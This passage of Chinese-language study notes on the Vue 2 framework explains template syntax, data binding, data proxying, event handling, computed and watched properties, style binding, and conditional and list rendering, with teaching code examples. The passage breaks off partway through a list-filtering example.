# vue2

## 一、简介

### 1.官网

- 英文官网: https://vuejs.org/ 
- 中文官网: https://cn.vuejs.org/

### 2.介绍与描述 

- 动态构建用户界面的**渐进式** JavaScript 框架 
- 作者: 尤雨溪 

### 3.Vue 的特点

- 遵循 **MVVM** 模式 
- 编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发

- 它本身只关注 UI, 也可以引入其它第三方库开发项目

### 4.与其它 JS 框架的关联

- 借鉴 Angular 的**模板**和**数据绑定**技术 
- 借鉴 React 的**组件化**和**虚拟 DOM** 技术 

### 5.Vue 周边库

- vue-cli: vue 脚手架 
- vue-resource 
- axios 
- vue-router: 路由 
- vuex: 状态管理 
- element-ui: 基于 vue 的 UI 组件库(PC 端)

### 6.初识Vue

- 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
- root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
- root容器里的代码被称为【Vue模板】；
- Vue实例和容器是一一对应的；
- 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
- {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
- 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

注意区分：js表达式 和 js代码(语句)

1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
               (1). a
               (2). a+b
               (3). demo(1)
               (4). x === y ? 'a' : 'b'

2.js代码(语句)
               (1). if(){}
               (2). for(){}

```
<!-- 准备好一个容器 -->
<div id="demo">
   <h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>

<script type="text/javascript" >
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   //创建Vue实例
   new Vue({
      el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
      data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
         name:'weixiaoyun',
         address:'湖北'
      }
   })
```

![初识vue2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E5%88%9D%E8%AF%86vue2.png)

## 二、Vue模板语法



Vue模板语法有2大类：

1.插值语法：

- 功能：用于解析标签体内容。
- 写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

2.指令语法：

- 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
- 举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性。
- 备注：Vue中有很多的指令，且形式都是：v-????

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h1>插值语法</h1>
      <h3>你好，{{name}}</h3>
      <hr/>
      <h1>指令语法</h1>
      <a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
      <a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         name:'jack',
         school:{
            name:'百度',
            url:'http://www.baidu.com',
         }
      }
   })
</script>
```

![模板语法](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95.png)

## 三、数据绑定 

Vue中有2种数据绑定的方式：

1. 单向绑定(v-bind)：数据只能从data流向页面。
2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。

- 备注：

  双向绑定一般都应用在表单类元素上（如：input、select等）

  v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值

```
    <div id="root">
      <!-- 普通写法 -->
      <!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
      双向数据绑定：<input type="text" v-model:value="name"><br/> -->

      <!-- 简写 -->
      单向数据绑定：<input type="text" :value="name"><br/>
      双向数据绑定：<input type="text" v-model="name"><br/>

      <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
      <!-- <h2 v-model:x="name">你好啊</h2> -->
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         name:'wxy'
      }
   })
</script>
```

![单向数据绑定](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E5%8D%95%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A.png)

![双向数据绑定](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A.png)

## 四、el与data的两种写法

data与el的2种写法

1.el有2种写法

- new Vue时候配置el属性。
- 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。

2.data有2种写法

- 对象式
- 函数式
- 如何选择：目前哪种写法都可以，但是在组件当中，data必须使用函数式，否则会报错。

3.一个重要的原则：

**由Vue管理的函数，一定不要写箭头函数**，一旦写了箭头函数，this就不再是Vue实例了

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h1>你好，{{name}}</h1>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   //el的两种写法
   /* const v = new Vue({
      //el:'#root', //第一种写法
      data:{
         name:'尚硅谷'
      }
   })
   console.log(v)
   v.$mount('#root') //第二种写法 */

   //data的两种写法
   new Vue({
      el:'#root',
      //data的第一种写法：对象式
      /* data:{
         name:'wxy'
      } */

      //data的第二种写法：函数式
      data(){
         console.log('@@@',this) //此处的this是Vue实例对象
         return{
            name:'wxy'
         }
      }
   })
</script>
```

## 五、MVVM模型

MVVM模型
            1. M：模型(Model) ：data中的数据
            2. V:  视图(View) ：模板代码
            3. VM：视图模型(ViewModel)：Vue实例

观察发现：

1. data中所有的属性，最后都出现在了vm身上。
2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```
<body>

   <!-- 准备好一个容器-->
   <div id="root">
      <h1>学校名称：{{name}}</h1>
      <h1>学校地址：{{address}}</h1>
       <h1>测试一下1：{{1+1}}</h1>
      <h1>测试一下2：{{$options}}</h1>
      <!--<h1>测试一下3：{{$emit}}</h1>
      <h1>测试一下4：{{_c}}</h1>-->
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         name:'wxy',
         address:'hubei',
      }
   })
   console.log(vm)
</script>
```

![MVVM模型](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/MVVM%E6%A8%A1%E5%9E%8B.png)

![模型](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%A8%A1%E5%9E%8B.png)

## 六、数据代理

### 1.Object.defineProperty

```
let number = 18
let person = {
   name:'张三',
   sex:'男',
}

Object.defineProperty(person,'age',{
   // value:18,
   // enumerable:true, //控制属性是否可以枚举，默认值是false
   // writable:true, //控制属性是否可以被修改，默认值是false
   // configurable:true //控制属性是否可以被删除，默认值是false

   //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
   get(){
      console.log('有人读取age属性了')
      return number
   },

   //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
   set(value){
      console.log('有人修改了age属性，且值是',value)
      number = value
   }

})

console.log(Object.keys(person)) // ['name', 'sex']

console.log(person) //{name: '张三', sex: '男'}
```

### 2.数据代理

通过一个对象代理对另一个对象中属性的操作（读/写）

```
let obj = {x:100}
let obj2 = {y:200}

Object.defineProperty(obj2,'x',{
   get(){
      return obj.x
   },
   set(value){
      obj.x = value
   }
})
```

![数据代理](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.png)

### 3.Vue中的数据代理

1.Vue中的数据代理：

​	通过vm对象来代理data对象中属性的操作（读/写）

2.Vue中数据代理的好处：

​	更加方便的操作data中的数据

3.基本原理：

​	通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         name:'wxy',
         address:'hubei'
      }
   })
</script>
```

当你修改vm中的数据时，界面渲染的数据也会同时发生变化：

![vue数据代理](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/vue%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.png)

## 七、事件处理

事件的基本使用：

- 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
- 事件的回调需要配置在methods对象中，最终会在vm上；
- methods中配置的函数，不要用箭头函数！否则this就不是vm了；
- methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
- @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

### 1.绑定监听

- v-on:xxx="fun" 
- @xxx="fun" 
- @xxx="fun(参数)" 
- 默认事件形参: event 
- 隐含属性对象: $event

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>欢迎来到{{name}}学习</h2>
      <!-- <button v-on:click="showInfo">点我提示信息</button> -->
      <button @click="showInfo1">点我提示信息1（不传参）</button>
      <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         name:'vue',
      },
      methods:{
         showInfo1(event){
            // console.log(event.target.innerText) //点我提示信息1（不传参）
            // console.log(this) //此处的this是vm
            alert('同学你好！')
         },
         showInfo2(event,number){
            console.log(event,number) //PointerEvent {isTrusted: true, pointerId: 1, width: 1, height: 1, pressure: 0, …} 66
            console.log(event.target.innerText) //点我提示信息2（传参）
            // console.log(this) //此处的this是vm
            alert('同学你好！！')
         }
      }
   })
</script>
```

![绑定监听](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%BB%91%E5%AE%9A%E7%9B%91%E5%90%AC.png)

### 2.事件修饰符

Vue中的事件修饰符：

- prevent：阻止默认事件（常用）；
- stop：阻止事件冒泡（常用）；
- once：事件只触发一次（常用）；
- capture：使用事件的捕获模式；
- self：只有event.target是当前操作的元素时才触发事件；
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>欢迎来到{{name}}学习</h2>
      <!-- 阻止默认事件（常用） -->
      <!--单击该链接会弹窗但不会跳转页面-->
      <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>

      <!-- 阻止事件冒泡（常用） -->
      <div class="demo1" @click="showInfo">
         <button @click.stop="showInfo">点我提示信息</button> <!--只弹出一次消息-->
         <!-- 修饰符可以连续写 -->
         <!-- <a href="http://www.baidu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
      </div>

      <!-- 事件只触发一次（常用） -->
      <button @click.once="showInfo">点我提示信息</button>

      <!-- 使用事件的捕获模式 -->
      <!--该处单击box1只打印1，单击box2打印1,2-->
      <div class="box1" @click.capture="showMsg(1)">
         div1
         <div class="box2" @click="showMsg(2)">
            div2
         </div>
      </div>

      <!-- 只有event.target是当前操作的元素时才触发事件； -->
      <!--效果上也达到了阻止冒泡的作用，原理上即为点击button冒泡到div打印的event.target还是button，并不是div自身，
      所以不触发@click.self的事件-->
      <div class="demo1" @click.self="showInfo">
         <button @click="showInfo">点我提示信息</button>
      </div>

      <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
      <!--区分：
      @scroll和@wheel: scroll相当于给滚动条添加事件，即鼠标滚轮滚动滚动条或单击滚动条滚动都可以触发@scroll事件，滚动条滚到底后不能触发
      但是@wheel相当于给鼠标滚轮绑定事件，只能通过鼠标滚轮触发，即使滚动条滚动到底滚轮也能触发该事件
      @wheel和@wheel.passive:
      @wheel：当滚动滚轮时先触发滚动事件，滚动条再滚动
      @wheel.passive: 无须等待绑定的demo事件执行完毕，滚轮也往下滚动了-->
      <ul @wheel.passive="demo" class="list">
         <li>1</li>
         <li>2</li>
         <li>3</li>
         <li>4</li>
      </ul>

   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         name:'vue'
      },
      methods:{
         showInfo(e){
            alert('同学你好！')
            // console.log(e.target)
         },
         showMsg(msg){
            console.log(msg)
         },
         demo(){
            for (let i = 0; i < 100000; i++) {
               console.log('#')
            }
            console.log('累坏了')
         }
      }
   })
</script>
```

### 3.键盘事件

1.Vue中常用的按键别名：
         回车 => enter
         删除 => delete (捕获“删除”和“退格”键)
         退出 => esc
         空格 => space
         换行 => tab (特殊，必须配合keydown去使用)
         上 => up
         下 => down
         左 => left
         右 => right

2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
如

```
@keyup.caps-lock
```

3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
         (1) 当配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
         (2) 当配合keydown使用：正常触发事件。

4.也可以使用keyCode去指定具体的按键（不推荐）

5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>欢迎来到{{name}}学习</h2>
      <!--当按下回车按钮，控制台打印input绑定的值-->
      <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

   new Vue({
      el:'#root',
      data:{
         name:'vue'
      },
      methods: {
         showInfo(e){
            // console.log(e.key,e.keyCode)
            console.log(e.target.value)
         }
      },
   })
</script>
```

## 八、计算属性与监视属性

### 1.计算属性

- 要显示的数据不存在，要通过计算得来。 
- 在 computed 对象中定义计算属性。 
- 在页面中使用{{方法名}}来显示计算的结果。

method实现：

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      姓：<input type="text" v-model="firstName"> <br/><br/>
      名：<input type="text" v-model="lastName"> <br/><br/>
      全名：<span>{{fullName()}}</span>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         firstName:'张',
         lastName:'三'
      },
      methods: {
         fullName(){
            console.log('@---fullName')
            return this.firstName + '-' + this.lastName
         }
      },
   })
</script>
```

![methods实现](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/methods%E5%AE%9E%E7%8E%B0.png)

由于data中数据变动，导致vue重新解析模板，然后调用方法，所以每次数据改变，就会重新调用方法

计算属性：

- 定义：要用的属性不存在，要通过已有属性计算得来。
- 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
- get函数什么时候执行？
  - 初次读取时会执行一次。
  - 当依赖的数据发生改变时会被再次调用。
- 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
- 备注：
  - 计算属性最终会出现在vm上，直接读取使用即可。
  - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      姓：<input type="text" v-model="firstName"> <br/><br/>
      名：<input type="text" v-model="lastName"> <br/><br/>
      测试：<input type="text" v-model="x"> <br/><br/>
      全名：<span>{{fullName}}</span> <br/><br/>
      <!-- 全名：<span>{{fullName}}</span> <br/><br/>
      全名：<span>{{fullName}}</span> <br/><br/>
      全名：<span>{{fullName}}</span> -->
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         firstName:'张',
         lastName:'三',
         x:'你好'
      },
      methods: {
         demo(){
            
         }
      },
      computed:{
         fullName:{
            //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
            //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
            get(){
               console.log('get被调用了')
               // console.log(this) //此处的this是vm
               return this.firstName + '-' + this.lastName
            },
            //set什么时候调用? 当fullName被修改时。
            set(value){
               console.log('set',value)
               const arr = value.split('-')
               this.firstName = arr[0]
               this.lastName = arr[1]
            }
         }
      }
```

完整写法：

```

/* fullName:{
   get(){
      console.log('get被调用了')
      return this.firstName + '-' + this.lastName
   },
   set(value){
      console.log('set',value)
      const arr = value.split('-')
      this.firstName = arr[0]
      this.lastName = arr[1]
   }
} */

```

简写：

```
fullName(){
   console.log('get被调用了')
   return this.firstName + '-' + this.lastName
}
```

### 2.监视属性

- 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
- 监视的属性必须存在，才能进行监视！！
- 监视的两种写法：
  - new Vue时传入watch配置
  - 通过vm.$watch监视

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>今天天气很{{info}}</h2>
      <button @click="changeWeather">切换天气</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   
   const vm = new Vue({
      el:'#root',
      data:{
         isHot:true,
      },
      computed:{
         info(){
            return this.isHot ? '炎热' : '凉爽'
         }
      },
      methods: {
         changeWeather(){
            this.isHot = !this.isHot
         }
      },
      /* watch:{
         isHot:{
            immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
               console.log('isHot被修改了',newValue,oldValue)
            }
         }
      } */
   })

   vm.$watch('isHot',{
      immediate:true, //初始化时让handler调用一下
      //handler什么时候调用？当isHot发生改变时。
      handler(newValue,oldValue){
         console.log('isHot被修改了',newValue,oldValue)
      }
   })
</script>
```

深度监视：

- Vue中的watch默认不监测对象内部值的改变（一层）
- 配置deep:true可以监测对象内部值改变（多层）
- 备注：
  - Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
  - 使用watch时根据数据的具体结构，决定是否采用深度监视。

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>今天天气很{{info}}</h2>
      <button @click="changeWeather">切换天气</button>
      <hr/>
      <h3>a的值是:{{numbers.a}}</h3>
      <button @click="numbers.a++">点我让a+1</button>
      <h3>b的值是:{{numbers.b}}</h3>
      <button @click="numbers.b++">点我让b+1</button>
      <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
      {{numbers.c.d.e}}
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   
   const vm = new Vue({
      el:'#root',
      data:{
         isHot:true,
         numbers:{
            a:1,
            b:1,
            c:{
               d:{
                  e:100
               }
            }
         }
      },
      computed:{
         info(){
            return this.isHot ? '炎热' : '凉爽'
         }
      },
      methods: {
         changeWeather(){
            this.isHot = !this.isHot
         }
      },
      watch:{
         isHot:{
            // immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
               console.log('isHot被修改了',newValue,oldValue)
            }
         },
         //监视多级结构中某个属性的变化
         /* 'numbers.a':{
            handler(){
               console.log('a被改变了')
            }
         } */
         //监视多级结构中所有属性的变化
         numbers:{
            deep:true,
            handler(){
               console.log('numbers改变了')
            }
         }
      }
   })

</script>
```

正常写法：

```
 isHot:{
   // immediate:true, //初始化时让handler调用一下
   // deep:true,//深度监视
   handler(newValue,oldValue){
      console.log('isHot被修改了',newValue,oldValue)
   }
}, 
```

```
 vm.$watch('isHot',{
   immediate:true, //初始化时让handler调用一下
   deep:true,//深度监视
   handler(newValue,oldValue){
      console.log('isHot被修改了',newValue,oldValue)
   }
}) 
```

简写：

```
 isHot(newValue,oldValue){
   console.log('isHot被修改了',newValue,oldValue,this)
} 
```

```
 vm.$watch('isHot',(newValue,oldValue)=>{
   console.log('isHot被修改了',newValue,oldValue,this)
}) 
```

### 3.computed和watch之间的区别

- computed能完成的功能，watch都可以完成。
- watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
- 两个重要的小原则：
  - 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
  - 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      姓：<input type="text" v-model="firstName"> <br/><br/>
      名：<input type="text" v-model="lastName"> <br/><br/>
      全名：<span>{{fullName}}</span> <br/><br/>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         firstName:'张',
         lastName:'三',
         fullName:'张-三'
      },
      watch:{
         firstName(val){
            /*箭头函数 this 指向声明时所在作用域下 this 的值，所以setTimeout里的回调
            函数的 this 值即为firstName定义时的 this 值，即为vm；如果setTimeout里的函数
            为普通函数，则this值为window*/
            setTimeout(()=>{
               console.log(this)
               this.fullName = val + '-' + this.lastName
            },1000);
         },
         lastName(val){
            this.fullName = this.firstName + '-' + val
         }
      }
   })
```

## 九、绑定样式

在应用界面中, 某个(些)元素的样式是变化的 ，class/style 绑定就是专门用来实现动态样式效果的技术

### 1.class样式

- 写法:class="xxx" xxx可以是字符串、对象、数组。
- 字符串写法适用于：'classA'，类名不确定，要动态获取。
- 对象写法适用于：{classA:isA, classB: isB}，要绑定多个样式，个数不确定，名字也不确定。
- 数组写法适用于：['classA', 'classB']，要绑定多个样式，个数确定，名字也确定，但不确定用不用。

### 2.style样式

- :style="{fontSize: xxx}"其中xxx是动态值。
- :style="[a,b]"其中a、b是样式对象。

```
    <style>
      .basic{
         width: 400px;
         height: 100px;
         border: 1px solid black;
      }

      .happy{
         border: 4px solid red;;
         background-color: rgba(255, 255, 0, 0.644);
         background: linear-gradient(30deg,yellow,pink,orange,yellow);
      }
      .sad{
         border: 4px dashed rgb(2, 197, 2);
         background-color: gray;
      }
      .normal{
         background-color: skyblue;
      }

      .style1{
         background-color: yellowgreen;
      }
      .style2{
         font-size: 30px;
         text-shadow:2px 2px 10px red;
      }
      .style3{
         border-radius: 20px;
      }
   </style>
   <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
      <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

      <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
      <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

      <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
      <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

      <!-- 绑定style样式--对象写法 -->
      <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
      <!-- 绑定style样式--数组写法 -->
      <div class="basic" :style="styleArr">{{name}}</div>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   const vm = new Vue({
      el:'#root',
      data:{
         name:'尚硅谷',
         mood:'normal',
         classArr:['style1','style2','style3'],
         classObj:{
            style1:false,
            style2:false,
         },
         styleObj:{
            fontSize: '40px',
            color:'red',
         },
         styleObj2:{
            backgroundColor:'orange'
         },
         styleArr:[
            {
               fontSize: '40px',
               color:'blue',
            },
            {
               backgroundColor:'gray'
            }
         ]
      },
      methods: {
         changeMood(){
            const arr = ['happy','sad','normal']
            const index = Math.floor(Math.random()*3)
            this.mood = arr[index]
         }
      },
   })
</script>
```

## 十、条件渲染

### 1.v-if

- 写法：
  - v-if="表达式" 
  - v-else-if="表达式"
  - v-else="表达式"
- 适用于：切换频率较低的场景。
- 特点：不展示的DOM元素直接被移除。
- 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

### 2.v-show

- 写法：v-show="表达式"
- 适用于：切换频率较高的场景。
- 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

### 3.备注：

使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>当前的n值是:{{n}}</h2>
      <button @click="n++">点我n+1</button>
      <!-- 使用v-show做条件渲染 -->
      <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
      <!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

      <!-- 使用v-if做条件渲染 -->
      <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
      <!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

      <!-- v-else和v-else-if -->
      <!-- <div v-if="n === 1">Angular</div>
      <div v-else-if="n === 2">React</div>
      <div v-else-if="n === 3">Vue</div>
      <div v-else>哈哈</div> -->

      <!-- v-if与template的配合使用 -->
      <template v-if="n === 1">
         <h2>你好</h2>
         <h2>vue</h2>
         <h2>北京</h2>
      </template>

   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   const vm = new Vue({
      el:'#root',
      data:{
         name:'vue',
         n:0
      }
   })
</script>
```

![条件渲染1](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%931.png)

![条件渲染2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%932.png)

## 十一、列表渲染

### 1.基本列表

v-for指令:

- 用于展示列表数据
- 语法：v-for="(item, index) in xxx" :key="yyy"
- 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```
<!-- 准备好一个容器-->
<div id="root">
   <!-- 遍历数组 -->
   <h2>人员列表（遍历数组）</h2>
   <ul>
      <li v-for="(p,index) of persons" :key="index">
         {{p.name}}-{{p.age}}
      </li>
   </ul>

   <!-- 遍历对象 -->
   <h2>汽车信息（遍历对象）</h2>
   <ul>
      <li v-for="(value,k) of car" :key="k">
         {{k}}-{{value}}
      </li>
   </ul>

   <!-- 遍历字符串 -->
   <h2>测试遍历字符串（用得少）</h2>
   <ul>
      <li v-for="(char,index) of str" :key="index">
         {{char}}-{{index}}
      </li>
   </ul>
   
   <!-- 遍历指定次数 -->
   <h2>测试遍历指定次数（用得少）</h2>
   <ul>
      <li v-for="(number,index) of 5" :key="index">
         {{index}}-{{number}}
      </li>
   </ul>
</div>

<script type="text/javascript">
   Vue.config.productionTip = false
   
   new Vue({
      el:'#root',
      data:{
         persons:[
            {id:'001',name:'张三',age:18},
            {id:'002',name:'李四',age:19},
            {id:'003',name:'王五',age:20}
         ],
         car:{
            name:'奥迪A8',
            price:'70万',
            color:'黑色'
         },
         str:'hello'
      }
   })
</script>
```

![列表渲染](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93.png)

### 2.key的原理

面试题：react、vue中的key有什么作用？（key的内部原理）

1.虚拟DOM中key的作用：

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 

随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2.对比规则：

- 旧虚拟DOM中找到了与新虚拟DOM相同的key：
  - ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
  - ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
- 旧虚拟DOM中未找到与新虚拟DOM相同的key
  - 创建新的真实DOM，随后渲染到到页面。
                            

3.用index作为key可能会引发的问题：

- 若对数据进行：逆序添加、逆序删除等破坏顺序操作:会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
- 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。

4.开发中如何选择key?:

- 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
- 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
  使用index作为key是没有问题的。

```
<!-- 准备好一个容器-->
<div id="root">
   <!-- 遍历数组 -->
   <h2>人员列表（遍历数组）</h2>
   <button @click.once="add">添加一个老刘</button>
   <ul>
      <li v-for="(p,index) of persons" :key="index">
         {{p.name}}-{{p.age}}
         <input type="text">
      </li>
   </ul>
</div>

<script type="text/javascript">
   Vue.config.productionTip = false
   
   new Vue({
      el:'#root',
      data:{
         persons:[
            {id:'001',name:'张三',age:18},
            {id:'002',name:'李四',age:19},
            {id:'003',name:'王五',age:20}
         ]
      },
      methods: {
         add(){
            const p = {id:'004',name:'老刘',age:40}
            this.persons.unshift(p)
         }
      },
   })
</script>
```

![key的原理1](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/key%E7%9A%84%E5%8E%9F%E7%90%861.png)

![key的原理2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/key%E7%9A%84%E5%8E%9F%E7%90%862.png)

![key的原理图](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/key%E7%9A%84%E5%8E%9F%E7%90%86%E5%9B%BE.png)

### 3.列表过滤

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>人员列表</h2>
      <input type="text" placeholder="请输入名字" v-model="keyWord">
      <ul>
         <li v-for="(p,index) of filPerons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
         </li>
      </ul>
   </div>

   <script type="text/javascript">
      Vue.config.productionTip = false
      
      //用watch实现
      //#region 
      /* new Vue({
         el:'#root',
         data:{
            keyWord:'',
            persons:[
               {id:'001',name:'马冬梅',age:19,sex:'女'},
               {id:'002',name:'周冬雨',age:20,sex:'女'},
               {id:'003',name:'周杰伦',age:21,sex:'男'},
               {id:'004',name:'温兆伦',age:22,sex:'男'}
            ],
            filPerons:[]
         },
         watch:{
            keyWord:{
               immediate:true,
               handler(val){
